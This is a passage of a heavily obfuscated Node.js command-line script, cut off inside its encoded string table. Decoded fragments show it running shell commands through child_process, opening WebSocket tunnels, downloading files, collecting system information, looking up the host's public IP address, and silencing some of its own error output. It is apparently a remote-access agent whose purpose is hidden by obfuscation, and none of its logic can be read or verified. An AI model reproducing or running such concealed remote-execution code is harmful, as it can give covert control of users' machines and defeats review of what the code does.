#!/usr/bin/env node
const a0aO = a0b;
(function (a, b) {
    const aN = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(aN(0x61d)) / 0x1 * (-parseInt(aN(0x37f)) / 0x2) + parseInt(aN(0x44d)) / 0x3 * (-parseInt(aN(0x1ea)) / 0x4) + parseInt(aN(0x72e)) / 0x5 + parseInt(aN(0x3cc)) / 0x6 * (-parseInt(aN(0x5da)) / 0x7) + -parseInt(aN(0x634)) / 0x8 * (-parseInt(aN(0x30a)) / 0x9) + parseInt(aN(0x2b2)) / 0xa * (-parseInt(aN(0x3c6)) / 0xb) + parseInt(aN(0x17b)) / 0xc * (-parseInt(aN(0x16a)) / 0xd);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x4d985));
const a0c = [
    a0aO(0x6ca),
    'Failed\x20to\x20parse\x20URL\x20from',
    a0aO(0x1a4)
];
function a0d(a) {
    const aP = a0aO, b = {
            'UwzKT': function (c, d) {
                return c === d;
            },
            'LXRNx': aP(0x253),
            'ZradC': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const aQ = aP, g = c[aQ(0x3e1)]();
        if (a0c[aQ(0x4ad)](h => g['includes'](h))) {
            if (b[aQ(0x33d)](typeof f, b[aQ(0x313)]))
                b[aQ(0x4be)](f);
            return !![];
        }
        return a[aQ(0x594)](this, arguments);
    };
}
process[a0aO(0x6c7)]['write'] = a0d(process['stdout'][a0aO(0x34b)]), process[a0aO(0x753)][a0aO(0x34b)] = a0d(process['stderr'][a0aO(0x34b)]);
const a0f = require(a0aO(0x4a7)), a0g = require(a0aO(0x34a)), a0h = require(a0aO(0x2c7)), a0i = require(a0aO(0x4e6)), a0j = require(a0aO(0x772)), a0k = require(a0aO(0x74e)), a0l = require('fs'), a0m = require('fs')['promises'], a0n = require(a0aO(0x738)), a0o = require('os'), a0p = require(a0aO(0x21c)), {
        exec: a0q,
        spawn: a0r
    } = require(a0aO(0x24e)), a0s = require(a0aO(0x46f)), a0t = require('systeminformation'), {encrypt: a0u} = require(a0aO(0x2f6)), a0v = require(a0aO(0x2bf)), a0w = require(a0aO(0x3eb)), a0x = require(a0aO(0x4eb));
let a0y, a0z, a0A;
try {
    typeof Bun !== a0aO(0x306) ? a0A = require(a0aO(0x3d0)) : a0A = require(a0aO(0x42a));
} catch (a0aM) {
    console[a0aO(0x49c)](a0aO(0x586)), console[a0aO(0x49c)](a0aO(0x6d2) + a0aM[a0aO(0x6ac)]), console['error'](a0aO(0x6fa)), process[a0aO(0x3cd)](0x1);
}
const a0B = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const aR = a0aO, a = {
                'GRXbO': function (b, c) {
                    return b !== c;
                }
            };
        return a[aR(0x599)](typeof a0N, aR(0x306)) && a[aR(0x599)](a0N['LOG_LEVEL'], undefined) ? a0N[aR(0x615)] : 0x2;
    },
    'debug': a => {
        const aS = a0aO, b = {
                'jFlwr': function (c, d) {
                    return c <= d;
                }
            };
        b['jFlwr'](a0B[aS(0x575)], a0B[aS(0x2cb)][aS(0x145)]) && console[aS(0x6b8)](aS(0x4f2) + a);
    },
    'info': a => {
        const aT = a0aO, b = {
                'ZjrlA': function (c, d) {
                    return c <= d;
                }
            };
        b[aT(0x6ab)](a0B['currentLevel'], a0B[aT(0x2cb)][aT(0x37d)]) && console['log']('\x1b[36m[INFO]\x1b[0m\x20' + a);
    },
    'warn': a => {
        const aU = a0aO, b = {
                'rJyvE': function (c, d) {
                    return c <= d;
                }
            };
        b[aU(0x268)](a0B[aU(0x575)], a0B['LEVELS'][aU(0x57d)]) && console[aU(0x6b8)](aU(0x44e) + a);
    },
    'error': a => {
        const aV = a0aO, b = {
                'SZQOk': function (c, d) {
                    return c <= d;
                }
            };
        b[aV(0x4ed)](a0B[aV(0x575)], a0B[aV(0x2cb)][aV(0x151)]) && console[aV(0x6b8)]('\x1b[31m[ERROR]\x1b[0m\x20' + a);
    }
};
function a0C() {
    const aW = a0aO, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0o[aW(0x315)](),
            process[aW(0x41e)]()
        ];
    for (const b of a) {
        if (b && a0l[aW(0x45d)](b) && a0l[aW(0x59e)](b)[aW(0x1ae)]())
            return b;
    }
    return process['cwd']();
}
function a0a() {
    const fG = [
        'q2fWj24GuhjVDg8GCg9PBNrLCIbVDxqGB2yGyM91BMrZ',
        'BuHyA1K',
        'u3bVBxq',
        'zxHWB3j0CW',
        'BxnNuMvZB2X2zxjZ',
        'z3DWug8',
        'C2vJlxDLyNnVy2TLDc1Hy2nLChq',
        'DeTzD0G',
        'u0jPqxa',
        'Dw5SAw5Ru3LUyW',
        'Aw1Hz2uVANbLzW',
        'yxb3DNq',
        'BMLlBvG',
        'sMrNDe4',
        'y29Uy2f0',
        'C3rYAw5NAwz5',
        'AMngweu',
        'DM5lChy',
        're1IsuK',
        'rMfPBgvKihrVigXVywqGBM9PC2uTyY53yxnTig1VzhvSzq',
        'C3rYAw5N',
        'yxjNBYb0Dw5UzwWGzgvSzxrLzdOG',
        'mJaYnc4Xmc4Wlu5LEhvZ',
        'EYjZCMmIoIjVCMLNAw4IlcjMBg93x3jHDgvFBgLTAxrLzci6zMfSC2v9',
        'B3jPz2LUignVBM5Ly3rPB24GDgLTzw91Da',
        'A2nTqum',
        'x29Urgf0yunI',
        'tuvdqKy',
        'txjXrgC',
        'CMvJDxjZAxzL',
        'CMvXDwvZDf9Pza',
        'wu5VAgO',
        'sxnIu0m',
        'tK9ju0vFs0vz',
        'wMPYBee',
        'BwvZC2fNzq',
        'A3rlsKm',
        'w+E7IoERR+s8MUIVNsa',
        'C2vJDxjLq29UBMvJDa',
        'C2rsseu',
        'B1jKDeK',
        'AenJsfK',
        'l2fWAs9IyxnLAw5MBW',
        'veXoExC',
        'Aw1Hz2uVCg5N',
        'sMvXtxC',
        'veLnrvnuqu1qx1DjtKrpvW',
        'Bg9N',
        'Ce90Afe',
        'DgfN',
        '5lIj5QYH5O+H5OMl5lQK5lQs5zco5lUn5PYQ6l+B5ywLievZDgfIBgLZAgvKioEkTUAaGq',
        'tKnfu0S',
        'u0Lhsu5uigHHBMrSzxiGCMvNAxn0zxjLza',
        'tfHd',
        'rKflzfm',
        'EhzZt3O',
        'yxbWBgLJyxrPB24VEg1S',
        'vMzvyMy',
        'zgTgtwO',
        'sfbbq0SGshvMzM1HBIbft1mGAw5ZAwrLihn0CMLUzW',
        'EhvNExi',
        'q3jLyxrPBMCGrxHWCMvZCYbHChaUlI4',
        'C3rKB3v0',
        'shvIvuW',
        'CgvLCK1HEezYyw1L',
        'D2fZBsbZDhjLyw1PBMCGy29TCgLSzsbMywLSzwq',
        'qKPosui',
        'qwLSyu0',
        'C2T3ugi',
        's2jmDwS',
        'CgHHC2u',
        'CxvLDwu',
        'BwfPBG',
        'g1SZmw1BrKfuquWGrvjst1jDg1SWBsdOR6BNU4BPLjNOR686ia',
        'r0vu',
        'y2yTAw50lq',
        'z2v0qxzHAwXHyMXLu2HLBgW',
        'B3jPz2LUig11C3qGyMuGyw4GAhr0CdOVlYbVCIbODhrWCZOVlYbvuKW',
        'we9UvLq',
        'D2fYBMLUzW',
        'Dxb0Aw1L',
        'AK14yMC',
        't2Dbwxm',
        'qMf3B3a',
        'rwfTvKK',
        'svPgwNi',
        'mtb8mtv8n3W2FdeZFdb8mxWXmxWYFde0FdH8mtj8nxW5Fdr8mW',
        'D1vyDvq',
        'BxnNuxvLDwu',
        'reTpAum',
        'Ag9TzurPCG',
        'z2DKsxi',
        'q29UDhjVBgXLCG',
        'v25XtxO',
        'x25VDgLMEvDPBMrVD3m',
        'm3W0Fdb8nNW4Fdj8n3W1Fdf8oq',
        'zxrHzW',
        'runjrvnFufvcteLdx0Tfwv9qru0',
        'x2v4CgLYzun1CNjLBNq',
        'zw5mtMm',
        'z2v0uMvHBhrPBwvjBMzV',
        'CMvSyxrPDMu',
        'v2vIu29JA2v0ignVBM5Ly3rPB24Gyxr0zw1WDcb3AxrOihjLCxvLC3rFAwq6ia',
        'EwHlDhG',
        'v3f6veO',
        'EfP1Ehu',
        'l2fWAs90yxnRl2XVzY9VBMv0Aw1L',
        'Ahr0Chm6lY9Py2fUAgf6AxaUy29T',
        'BgLUzq',
        'tLfOAwO',
        'z2v0',
        'z2v0t3jdCMvHDgu',
        'wuzWs08',
        '8j+sOsdKV67LPi3LU7RORQ46ioIVT+wCQoMHUEEBRUEBRUw9LEs4I+I/KoIHJcbUCg0GAw5ZDgfSBcbaBhLKzwXSl25VzguTChr5',
        'CNb4yK4',
        'AKLrwvm',
        'zMXVB3i',
        'Ahr0Chm6lY9PCgvJAg8UBMv0l3bSywLU',
        'v2XYCuC',
        'ywnJzxb0lwvUy29KAw5N',
        '8j+sPsdMJ6hMIyVLPlhOTkxOR6BMG4u6ia',
        'Dgv4Dc9ODg1SoYbJAgfYC2v0pxv0zI04',
        '8j+uHcbBu0vdvvjjvfLDios4ToAxTUwVHUMsPEI/H+ACNYWG5BEY6l2U5O2Iifnfu1njt05Fs0vzios4JUAoP+wiTUERRYboB2LZzsdLR4BPKQxLR7KGkowqIoAZLEAoP+wiTUERR+MCGoMhJEAwSoIUPoIVGEIoT+wpLIbIyxnLAw5MBYdMLRdLR4BPKQuP',
        'x3nWBgL0qw5KrMLUAxnO',
        'DxbKyxrLlwnVBMzPz3vYyxrPB24',
        'Bu5XtMy',
        'z2v0rMLSzvbLCM1PC3nPB25Z',
        'DxbKyxrL',
        'BhHQtNq',
        'Dg90ywXFy2H1BMTZ',
        'zwnKC2fqDwjRzxK',
        'BeXir0e',
        'B3bdr1C',
        'Dw5JyxvNAhrfEgnLChrPB24',
        'ufvwtfi',
        'AMnVteS',
        'DhvUBMvSihjLz2LZDhjHDgLVBIbMywLSzwq6ia',
        'yKD0wfi',
        'C21Lz3y',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTsgvHzgvYCW',
        'y2fSBa',
        'yLjwrwC',
        'CMPiELm',
        'A25HBwvwywXPza',
        'sNzNvuG',
        'zNjLzq',
        'C2XPy2u',
        'AgvHzgvYCW',
        's01JqM0',
        'tfnzCKS',
        'B3zLCMXHEq',
        'BvjKrgK',
        'zwnPzxnFChvI',
        'vw5nA0G',
        'ihbYB3H5igzHAwXLzdOG',
        'CgnMDxK',
        'qK5KwNO',
        'AhHczwO',
        'v1b1tNm',
        'q1v0wem',
        'C3rVChbLza',
        'CNjvqMu',
        'B25LDgfZA3m',
        'Ahr0Chm6lY9PCgLUzM8UAw8VAxa',
        'uNvhwfq',
        'mJGWndy3me1Nwg5VwG',
        'yNrVDfK',
        'CwnbEg0',
        'tfzrtui',
        'zMLSzxm',
        'sevcENe',
        'ExDnC2u',
        'Bfrbt0S',
        'CxvPy2SGDhvUBMvSihjLDhvYBMvKig5VBI1ku09oicG',
        'twDvqKC',
        'Cgf0Aa',
        'quDftLrFvKvsu0LptG',
        'A3vIzxbVzhm',
        'DhvUBMvSrg9TywLU',
        'vLnoz28',
        'CMvHzezPBgvtEw5J',
        'Du5tAMC',
        'yuzezNq',
        'l2fWAs93CY8',
        'x3DHAxrxAw5KB3C',
        'uNrPBwvVDxq',
        'AxngAwXL',
        'D3jPDgvvsw50mZjcrq',
        'CgvYBwLZC2LVBNm',
        'zgvSzxrLza',
        'yLntDKq',
        'y29WEuzPBgvZ',
        'x2jHC2vPBMzVx2zLDgnOx3bYB21PC2u',
        'zgDwz0u',
        'x3bHCNnLtw9Kzq',
        'C3bSAwnL',
        'BMXduNa',
        'y3j5ChrV',
        'sLvxteS',
        'y0jYzMO',
        'y0rHEha',
        'wuPwquq',
        'C3rKzxjY',
        'uNbQyvu',
        'zw5K',
        'ywXS',
        'rK5Utu4',
        'Ahnlt0e',
        'ug9PBNq',
        'CffsB00',
        'z3jIB2q',
        'CM1KAxjtEw5J',
        'y2yTy2XVDwrMBgfYzwqT',
        'BufjwfC',
        'z2v0uhvIBgLJsxbwnG',
        'zxHLy3v0ywjSzq',
        'zhfJEvq',
        'tfzSqNa',
        'CMvQzwn0',
        'DuPjEMW',
        'sLnPAe0',
        'zfvwt1G',
        'CMvXDwvZDgLUzYbXDwLJAYb0Dw5UzwWGzMfPBgvKoIa',
        'BxbrENe',
        'sNf5qNK',
        'sw5PDfrHC2S',
        'zMH3ww0',
        'CfvXAfe',
        'Aw5PDa',
        'Cg1duKm',
        'BxjoveS',
        'z3PPCcWGzgvMBgf0zq',
        'CwrdtMW',
        'DgXZ',
        'y21KihjLCxvPCMvK',
        's0HsqxG',
        'D2fPDgvYCW',
        'CMvHzgfIBgu',
        'C2vUzeHLywrLCNm',
        'vw5ZDxbWB3j0zwqGCgvYBwLZC2LVBIbMB3jTyxqSig9UBhKGB2n0ywWGC3rYAw5NCYbHCMuGC3vWCg9YDgvK',
        'B2nMv3a',
        'DM1wwNq',
        'zxHLy3v0zu9UzxrPBwvuyxnRCW',
        'zw1nDKe',
        'C2Tlv0C',
        'Ahr0Chm6lY9TEwv4DgvYBMfSAxaUy29Tl3jHDW',
        'A2LSBgvK',
        'x3n0yxr1C19MzxrJAf9WCM9TAxnL',
        'z01lqNK',
        'z29AuMy',
        'wc1oB25Jzq',
        'tM9PC2uGCgvLCIbZDgf0AwmGA2v5ihzLCMLMAwnHDgLVBIbMywLSzwq',
        'C3DHCf90B3rHBa',
        'qLnKAfG',
        'svroreS',
        'y29UBMvJDgLVBLDPBMrVDW',
        'Ce10u3G',
        'DMfYEq',
        'y2fJAguTy29UDhjVBa',
        'C3DHChvZzwq',
        'CLLjtK0',
        'z2v0t25LDgLTzuXVz3m',
        'C3rYzwfTswq',
        'y2vPBa',
        'y3DUyvK',
        'x3zLCMLMEvDPDgG',
        'Aw5MBW',
        'tLnJrMy',
        '4PQG77Ipievdrfnb5ywS6zkL5yQG6l295AsX6lsLoIa',
        'Ahr0Chm6lY92nI5PzgvUDc5Tzq',
        'AxncDwzMzxi',
        'C3DHChrVDgfS',
        'tuzOzwm',
        'u01mA0G',
        'y3jLyxrLv3jPDgvtDhjLyw0',
        'A2vYBMvS',
        'CxLJDvG',
        'Edi1nte5',
        'tefxsfG',
        'zwjutve',
        'y29UDgvUDc1Szw5NDgG',
        'BxvSDgLWBguGDhvUBMvSCYbLEgLZDcbVBIbWB3j0ia',
        'Dhj1BMnHDgvKieHqqunlihn0CMLUzW',
        'ALjlEgO',
        'EeHHDxO',
        'C29JAW',
        't1b3A2C',
        'wxvLy2S',
        'q29dCMe',
        'yNvMzMvY',
        'zw5KC1DPDgG',
        'C3rHDhvZ',
        'mta0odu3nJaW',
        'DwvYDhu',
        'DhvUBMvSCW',
        'BeHoCuq',
        'EePIChi',
        'Be5frKO',
        's2jYzwe',
        'ExvIrfG',
        'Au9dteu',
        'vhbosuy',
        'z2v0t25LDgLTzvrHC2TZ',
        'wMftDuG',
        'y2LWAgvY',
        'y21KlMv4zq',
        'CMf3',
        'y29UBKLUzgv4',
        '8j+tPIbBq2fJAgvDifn0yxr1CYdLKB3KUk3NM5hMJQFNVjpLRzJJGii',
        'D3jPDgvuzxH0tgLZDa',
        'BKXJyMC',
        'CgLK',
        '8j+uJcdNU4JNQ6/OV5VNQiVPGidLH7OGkenVzgu6ia',
        'zgLZA190B3rHBa',
        'CeDfzKO',
        't1busu9ouW',
        'revcvuC',
        'zgf0yq',
        'ywnJzxnZlwnVBNrYB2WTywXSB3CTB3jPz2LU',
        'twLKzgXLD2fYzsbHChbSAwvKlcbZzxr0Aw5NihvWihjVDxrLCY4UlG',
        'AdiUy2z0Dw5UzwWUy29T',
        'zxjYB3jLza',
        'w0Tnt0rfxsdWN5Er77IpiowFN+wqJEAwH+s7TUw3SUwiOoMzPdOG',
        'B25fEgL0',
        'A3H1v3q',
        'DgnW',
        'BxrPBwu',
        'sKzqBw8',
        'rvjst1i',
        'rMDny2e',
        'y2H1BMTFAwqGyw5KihrVDgfSx2nODw5RCYbTDxn0igjLig51BwvYAwm',
        'x2jHC2vPBMzVsg9VA2vK',
        'Aw52ywXPzcbiuefdsYbiDwzMBwfUihbHzgrPBMC',
        't2ztsLu',
        'oMf1DgHVCML0Eq',
        'DwXsrwC',
        'zw5Kzwq',
        'l3r1BM5LBa',
        'D3jPDgvvsw50mZjmrq',
        'CMvTB3zLtgLZDgvUzxi',
        'ENHovMu',
        'BM90x2zVDw5K',
        'u3LZDgvTsw5MB0nVBgXLy3rVCIbPBML0AwfSAxPLza',
        'zgvJCNLWDerHDge',
        'Ewzlr1C',
        'sw52ywXPzcbIAw5HCNKGC3rYzwfTihjLCxvLC3qGyM9KEq',
        'zwjgEg4',
        'zMLUAxnOzwq',
        'x2fWCgvUzeXVzW',
        'Chr5uhjVy2vZCW',
        'zg93BMXVywrgAwXL',
        'uLn1CgC',
        'qLvhDwW',
        'mtn1AKnnu3q',
        'yMDjBvG',
        'yw1KBgC',
        'D2ruvvC',
        'CMvZDa',
        'ChjVy2vZC0HHBMrZAgfRzq',
        'vKDwzLy',
        'qMfKihnPz25HDhvYzq',
        'DhvUBMvSigfSCMvHzhKGzxHPC3rZig9UihbVCNqG',
        'BgXHCfi',
        'vw5JyxvNAhqGrxHJzxb0Aw9UoG',
        'Ahr0Chm6lY9HCgK2lMLWAwz5lM9YzW',
        'whnxDeu',
        's05btuu',
        'ntaW',
        'C2v0vgLTzw91Da',
        'rhrqEhq',
        'mJmYmZi4nfPjuKPYEq',
        'DhvUBMvSu2vJCMv0',
        'ywnJB3vUDfrHzW',
        'weLtvMG',
        'yun2sfO',
        'vgHtrMe',
        'oNn0yxr1CW',
        'ANnVBG',
        'x2LZrxHWAxjLza',
        'zM9YrwfJAa',
        'r2fby0S',
        't05ozhu',
        'AMTvCLC',
        'rMLSzsbUB3qGzM91BMq',
        'whbduvy',
        'y3jLyxrLuhvIBgLJs2v5',
        'D2vIC29JA2v0',
        'sMzMAu4',
        'q1DPEuO',
        'tePOsuS',
        'sNnOD0G',
        'CNLbsLy',
        'x25LEhq',
        'z1H2Egi',
        'y29UDhjVBgXLCG',
        'uwXoEgq',
        'C2vUza',
        'z1P3uNq',
        'C2v0q3jVBLrHC2TZ',
        'sw5PDgLHBgL6Aw5NifrLBxblzxLnyw5Hz2vYlI4U',
        'Aw1Hz2uVz2LM',
        'zgLYzwn0B3j5',
        'yM9KEq',
        'q1DNtwC',
        'te9Vsge',
        'nhWWFdj8m3WX',
        't1PRqvC',
        'C2HVD1r1BM5LBa',
        'DhvUBMvSswq',
        'l3bYB2mVms9Jz3jVDxa',
        'zhHXwMy',
        'zMfSBgLUzYbIywnRihrViefYCMf5qNvMzMvYigLUC3rHBNrPyxrPB24',
        'w/cFMQGG5lIL6yEn6k2M5zgkxsbymJu1mtKG5A+g6zkL6zw/5BQM6z2EidmYiowTL+IkGU+8Je5VAxnLiownJ+IURUw/HEwUMUw0QEA6G++8Gq',
        'y29Yzxm',
        'CMvJDKnPCgHLCG',
        'zwrNzsa',
        'DhLWzq',
        'v1rxB3m',
        'CMvHzgvY',
        'Agv4',
        'mc40lJGTANm',
        'AxneAxjLy3rVCNK',
        'BNPSyui',
        'Ahr0Chm6lY8',
        'x2DLDfzPCNr1ywXPEMf0Aw9U',
        'mxW1Fdj8m3W0Fdz8n3WW',
        'l2fWAs9MAwXLl2rVD25SB2fK',
        'y3jLyxrLzef0',
        'AgTTuhi',
        'tufyx1rbu0TFte9hx1njwKu',
        'wLntDuS',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov6kEJ5A+g5PwW5O2U',
        'A2v5x2LK',
        'zM1qwxq',
        'B2zADw0',
        'z2TJD0i',
        'BMfTzq',
        'ren0ANK',
        'ChjVyW',
        'u0jmr2i',
        'ELLMshu',
        'yKHID2u',
        'uuLjuve',
        '8j+AGcblAxnHBweGqwDLBNqGtM9Kzs5QCYb2',
        'EMn2tK0',
        'ChjPBNrLza',
        'l2jPBI9HC2G',
        'l3bYB2mVms9LBNzPCM9U',
        'D2LUmZi',
        'qxHPBhu',
        'wwDHu1G',
        'sw9ZwMm',
        'yNHmCxy',
        'w0Tnt0rfxsdWN5oeioMAP+MbK+wFN+wqJEw3SUwgMEwfPtOG',
        'y3jVBKPVyNm',
        'AMTlyMK',
        'Cw1PCLG',
        'zxHWB3j0',
        'CxvLCNK',
        'AgXvDwO',
        'A2HVtwW',
        'yNL0zuXLBMD0Aa',
        'AhbuyMG',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTt3jPz2LU',
        'C3rVCa',
        'A2v5x3nVDxjJzq',
        'y29UDgfPBMvYza',
        'AuvLzxO',
        'zgPRDgW',
        'yMjgtva',
        'zhLUyw1Py1nPEMu',
        'y29UDgvUDc1Yyw5Nzq',
        'wgn6uxu',
        'CK5JANC',
        'CMvHzgrPCLn5BMm',
        'BM93',
        'wLDbBNe',
        'qxv0AgvUDgLJyxrPB24GzMfPBgvKoIbjBNzHBgLKifrVA2vU',
        'Avrozg0',
        'C2LNBMfS',
        'x29UrxHPDenI',
        'nZi0nefnuu1QCq',
        'Bg9JyxrPB24',
        'DgvZDa',
        'ue9sva',
        'l2LUzgv4lMH0BwW',
        'zenlA0m',
        'tgPOtg0',
        'A2LSBa',
        'ufDcvgS',
        'Cg9YDcbPCYbYzxf1AxjLzcbHBMqGBxvZDcbIzsbHBIbPBNrLz2vYigjLDhDLzw4GmsbHBMqGnJu1mZu',
        't1P3D2O',
        'D3jPDgveB21HAw5gAwXL',
        'C3vyrhC',
        'su1yA2S',
        'EuzVsxK',
        'sfP3EwC',
        'BLjoBNO',
        'uwf0BxC',
        'BvrZzfG',
        'sw5PDgLHBgL6Aw5Nifn5C3rLBuLUzM9dB2XSzwn0B3iUlI4',
        'zgLNzxn0',
        'BgfZDc1TB2rPzMLLza',
        'x2DLDerPC2TjBMzV',
        'Bw9Kzv9Vy3rHBa',
        'svbcD2O',
        'EeTVDfC',
        'C3bHD24',
        'x2jHC2vPBMzVx2nHy2HL',
        'w0Tnt0rfxsdIMQdVUi8G5zcV5yQO6zQN6ygt5yIB5BU65AsX6lsLoIa',
        'D2LUzg93v2fPDgvYCW',
        'qwTbzem',
        'Cg9W',
        'CMvWB3j0u2H6ywW',
        'ywrKCMvZCW',
        'ExvbC3m',
        'EfHIA04',
        'zhrJBMG',
        'q2XLyw5SEsbJBg9Zzwq',
        'tKjyBfq',
        'CMvHzeHLywrLCNm',
        'rKLmrv9st09u',
        'ru1jzMG',
        'BhHJ',
        'CM90yxrLt3bLCMf0Aw9UywXtzwnYzxrZ',
        'v3rQwgi',
        'tgDKu2W',
        'CfPWB2S',
        'Cun2Bve',
        'z3nMDfq',
        'ChjVDg9JB2W',
        'CMvHzgXPBMu',
        'x2rYywLU',
        'v2LQv0K',
        'y2XLyw51Ca',
        'uwrlvMe',
        'oM1LDgHVza',
        'ywvZlti1nI1Ny20',
        'CMvWzwf0',
        'BwLctNO',
        'DMvNvu8',
        'mhWXFdn8mNW0',
        'ueHfEhO',
        'D2vIC29JA2v0ihn0CMvHBsa',
        'rgPoEvO',
        'yKfYsKG',
        'DgTQB0q',
        'Au5SwvO',
        'g1SZm21Bv0fstL0BwZbTiezjtevFuK9pvcdLGjNPGiNNM67LVzxKUi3LRzJLNkGSiow3SUI3S+I/HZOG',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5lM1HEa',
        'B3njBMzV',
        'CMvSzwfZzq',
        'yxbWBgLJyxrPB24VB2n0zxqTC3rYzwfT',
        't1L6BeS',
        'x2HHBMrSzvjHD01LC3nHz2u',
        'BMvLza',
        'Bgnsr1K',
        'DfbtCeu',
        'z2v0vgfZA1n0yxr1CW',
        'AxfHv1K',
        'tufyx1vqte9brf9tsvPf',
        't1HfDKy',
        'CMnKu1y',
        'rwTlvgC',
        'Dw5RBM93BIbLCNjVCG',
        'zw5JCNLWDfjLC3bVBNnL',
        'vxbNCMfKztOGD2vIC29JA2v0',
        'C2HVCNqGq2fWj24GuhjVDg8GCMv0DxjU',
        'yw94Cg0',
        'wwHoB2m',
        't1L4reu',
        'y29UBMvJDgLVBIbJBg9Zzwq',
        'r01zzwe',
        'wxH4uNq',
        'rLbvqxm',
        'zw50CMLLCW',
        'wvvHtNq',
        'AwyTCMfUz2u',
        'CMvKDwnL',
        'AgfUzgXLsgvHzgvYCW',
        'tK9ju0vFqunusu9ox1jfqurFtuvtu0fhrq',
        'y2HPBgrFChjVy2vZCW',
        'De5ABLO',
        'D29YA2rPCJ0VDMfYl2XPyI9KB2nRzxi',
        'CujhBLK',
        'CMvXDwvZDezPBMLZAgvK',
        'zNvUy3rPB24',
        'r0f1A0S',
        'runeu0fFufvcteLdx0Tfwv9qru0',
        'C2vUzfDPBMrVD1vWzgf0zq',
        'BMjeEfm',
        'zwveAvO',
        'ywnJB3vUDf90ywC',
        'l3j1BI8Uy29UDgfPBMvYzw52',
        'qunAuNy',
        'tuXJvKi',
        'BxfJzxO',
        'AgfUzhnOywTL',
        'r3PAuw4',
        'wgjAqLu',
        'BgvUz3rO',
        'mJa0',
        'qNvzrNy',
        'ANDVEfe',
        'C0Dpr0W',
        'y3jLyxrLrgvJAxbOzxjPDG',
        'Bw92zv9Tyxa',
        'CKP5DKu',
        'Dhj1zq',
        'tK9ju0vFs0vzu19jtLrfuK5bta',
        'D25lrxy',
        'yM1rv08',
        'z2v0q3jVBKXVz3m',
        'v0DcwK4',
        'CvnbDgq',
        'BwnTwK4',
        'z0TcDey',
        'Aw52ywXPzcbtrvrusu5huYbWyxLSB2fK',
        'tKTNAwe',
        'DxjS',
        'sfnvCKi',
        'CMvHzfvjBNqZmKXf',
        's1bbveG',
        'CxzvrwS',
        'tez3AMO',
        'zMfSC2u',
        'z2v0tg9JywXjuhy0',
        'AwDUB3jPBMCGy29UDhjVBcbsuemGBwvZC2fNztOG',
        'vuv3CwC',
        'DMvYAwz5u2LNBMf0DxjL',
        'y3vruhq',
        'zMfTAwX5',
        'C0rnzhO',
        'y2HtDLG',
        't0rWAe8',
        'yxv0Ag9YAxPHDgLVBG',
        'y29UDhjVBa',
        'r21sEgK',
        'nhWXFdz8n3WYFdv8mhWZ',
        'B3viuui',
        'AMD0t3G',
        'runjrvnFufvcs0vz',
        'teforW',
        'lNvWBg9Hzf9JAhvUA3m',
        'CM91BMq',
        'z01xAgK',
        'CgTJCZG',
        'sMHQr3u',
        'DxnL',
        'z2v0qwn0AxzLrwnPzxnqDwi',
        'x2TLEq',
        'y29UDgvUDc1KAxnWB3nPDgLVBG',
        'sfbbq0SGzhLUyw1PyYbPBMrLEcbVDxqGB2yGCMfUz2u',
        'zxLk',
        'zgLZDhjV',
        'runeu0fFufvcs0vz',
        'D2ntre0',
        'ze9YsKG',
        'B2rIuNK',
        'AKPIDwi',
        'DKnRs2u',
        'B2jQzwn0',
        'Ec1LBMnYExb0zwqSihGTywDLBNqTDMvYC2LVBIWGEc1MAwXLlxnPEMuSihGTB3jPz2LUywWTCgf0Aa',
        'l2fWAs9LEgvJ',
        'w1DbuK5Die5VAxnLifDbu00GBw9KDwXLigzHAwXLzcb0BYbSB2fKoG',
        'y2fbqxy',
        'wMnczxG',
        't1vUqwu',
        'y2yTChjVEhKT',
        'AK9kD04',
        'C3vIyxjYyxK',
        'BM8GDhvUBMvSigzVDw5Kig9UihbVCNqG',
        'y3btEw5J',
        'swn2AeC',
        'Dw5Oyw5KBgvKuMvQzwn0Aw9U',
        'w0Tnt0rfxsdIMQdVUi8G5z+F5zcn5PAh5lU25yAz5ywL5AsX6lsLicG',
        'C2vJlxDLyNnVy2TLDc12zxjZAw9U',
        'y2H1BMTF',
        'Ec1MAwXLlw5HBwu',
        'B25eyxrH',
        'q29UBMvJDgLVBJOGvxbNCMfKzq',
        'nte2mtCWv1vOuKTJ',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTtwv0Ag9KCW',
        'rgvJCNLWDfDPDgHbza',
        'y3jVBMXVB3a',
        'wfncDLm',
        'r1LzreO',
        'DxrqCxu',
        'C2vJCdi1nMSX',
        'CgfiDfO',
        'D3jPDgvvsw50mtzcrq',
        'zfnMy28',
        'yM5NqLO',
        'x2jHC2vPBMzVx2nHy2HLx3rPBwu',
        'yMfZzty0lwPZ',
        'AKTQA3O',
        'BwvTx3rVDgfS',
        'C3bSAxq',
        'C3rHCNrZv2L0Aa',
        'CKTtD3m',
        'uLfsthK',
        'u2HkrgS',
        'Ahr0Chm',
        'wgjiCfq',
        'y1zbq0e',
        'rvvpDLq',
        'tevwruXt',
        'uc0Ynty',
        'sfDLzLm',
        'ru1hs3u',
        'l2fWAs93CY8Q',
        'x3bYB2nLC3nuzxjTAw5HBe1LC3nHz2u',
        'yxjJAa',
        'DurmEue',
        'x3rHC2TRAwXSvhjLzq',
        's01preu',
        'yxv0Ag9YAxr5',
        'whDKCKW',
        'EuXiDhe',
        'mJa2',
        'ChjPDMf0zq',
        'BLbKELm',
        'rxHWCMvZCYbHChaGy3jLyxrLzcbHBMqGzxHWCMvZC1DZigfWCgXPzwq',
        'qxv3Eg0',
        'EhnLzeW',
        'CMvZAxPL',
        'qwXSignODw5RCYbYzwnLAxzLzc4GrMLSzsbTzxjNzwqGC3vJy2vZC2z1BgX5lG',
        'ChjPDMf0zv9InJq',
        'ls0TlwTPC2fTyq',
        'zKjwr2q',
        'y29UDgvUDa',
        'DgvTCa',
        'wuj0tLC',
        'wwjrAvq',
        'rMf0ywWGzxjYB3iGAw4GBwfPBIGPoG',
        'C3rYDwn0uhrY',
        'q1jptL9dsevds19jtLrfuLzbta',
        'C2L6zq',
        'zufnvgW',
        'ywnJzxb0lxjHBMDLCW',
